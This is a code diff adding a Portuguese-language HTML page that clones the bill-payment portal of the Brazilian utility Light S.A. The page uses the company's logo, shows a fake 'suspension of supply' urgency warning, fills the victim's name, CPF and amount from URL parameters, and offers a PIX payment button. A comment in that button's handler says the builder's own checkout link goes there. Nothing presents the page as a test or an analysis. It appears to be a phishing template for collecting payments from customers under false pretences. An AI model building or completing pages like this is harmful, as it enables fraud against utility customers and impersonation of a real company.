@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Light - Segunda Via de Fatura</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+
+    <!-- Header Clonado Light -->
+    <header class="bg-white shadow-sm border-b-4 border-orange-500">
+        <div class="max-w-7xl mx-auto px-4 py-3 flex justify-between items-center">
+            <img src="https://www.light.com.br/SiteAssets/images/logo.png" alt="Light" class="h-12">
+            <nav class="hidden md:flex gap-6 text-sm font-medium text-gray-600">
+                <a href="#" class="hover:text-orange-500 transition">Serviços On-line</a>
+                <a href="#" class="hover:text-orange-500 transition">Informações</a>
+                <a href="#" class="hover:text-orange-500 transition">Atendimento</a>
+            </nav>
+            <button class="bg-orange-500 text-white px-4 py-2 rounded text-sm font-bold hover:bg-orange-600 transition">Agência Virtual</button>
+        </div>
+    </header>
+
+    <main class="max-w-4xl mx-auto px-4 py-10">
+        <!-- Alerta de Urgência -->
+        <div class="bg-red-100 border-l-4 border-red-600 p-4 mb-8 flex items-start gap-3 text-red-800 rounded-r-lg">
+            <i data-lucide="alert-triangle" class="shrink-0"></i>
+            <div>
+                <p class="font-bold">AVISO DE SUSPENSÃO DE FORNECIMENTO</p>
+                <p class="text-sm">Sua unidade consumidora apresenta débitos pendentes. A suspensão do serviço ocorrerá em breve caso a regularização não seja confirmada.</p>
+            </div>
+        </div>
+
+        <!-- Card da Fatura -->
+        <div class="bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200">
+            <div class="bg-gray-800 text-white p-6 flex justify-between items-center">
+                <div>
+                    <h1 class="text-xl font-bold">Segunda Via de Fatura</h1>
+                    <p class="text-gray-400 text-sm">Referência: Novembro/2026</p>
+                </div>
+                <div class="text-right">
+                    <p class="text-xs text-gray-400 uppercase font-bold">Valor Total</p>
+                    <p id="display-valor" class="text-2xl font-black text-orange-400">R$ 0,00</p>
+                </div>
+            </div>
+
+            <div class="p-8">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                    <div class="space-y-1">
+                        <label class="text-xs text-gray-500 uppercase font-bold">Nome do Titular</label>
+                        <p id="display-nome" class="text-lg font-medium border-b pb-1 text-gray-800">Carregando...</p>
+                    </div>
+                    <div class="space-y-1">
+                        <label class="text-xs text-gray-500 uppercase font-bold">CPF do Cliente</label>
+                        <p id="display-cpf" class="text-lg font-medium border-b pb-1 text-gray-800">...</p>
+                    </div>
+                </div>
+
+                <!-- Área do Boleto -->
+                <div class="bg-gray-100 p-6 rounded-lg border-2 border-dashed border-gray-300 text-center">
+                    <p class="text-sm text-gray-600 mb-4 font-medium">Linha Digitável para Pagamento</p>
+                    <div class="bg-white p-4 rounded border shadow-inner font-mono text-lg text-gray-800 mb-6 break-all">
+                        83640.70000 8 12345.678901 23456.789012 3 95421000000000
+                    </div>
+                    
+                    <div class="flex flex-col md:flex-row gap-4 justify-center">
+                        <button onclick="payPix()" class="flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-lg font-bold transition-all">
+                            <i data-lucide="check-circle" size="20"></i> Pagar via PIX (Baixa Instantânea)
+                        </button>
+                        <button class="flex items-center justify-center gap-2 bg-gray-200 hover:bg-gray-300 text-gray-700 px-6 py-3 rounded-lg font-bold transition-all">
+                            <i data-lucide="download" size="20"></i> Baixar PDF
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="mt-8 text-center text-gray-500 text-xs">
+            <p>A Light S.A. informa que a emissão de segunda via via portal é gratuita.</p>
+            <p class="mt-2">© 2026 Light S.A. - CNPJ 03.740.656/0001-10</p>
+        </div>
+    </main>
+
+    <script>
+        // Inicializa ícones do Lucide
+        lucide.createIcons();
+
+        // Lógica de Espelhamento de URL String
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            
+            const nome = params.get('nome') || 'Cliente Light';
+            const cpf = params.get('cpf') || '000.000.000-00';
+            const valor = params.get('valor') || '0,00';
+
+            document.getElementById('display-nome').innerText = nome;
+            document.getElementById('display-cpf').innerText = cpf;
+            document.getElementById('display-valor').innerText = 'R$ ' + valor;
+        };
+
+        function payPix() {
+            alert('Redirecionando para o Gateway de Pagamento Seguro da Light...');
+            // Aqui você colocaria o link do seu checkout ou página de pagamento
+        }
+    </script>
+</body>
+</html>
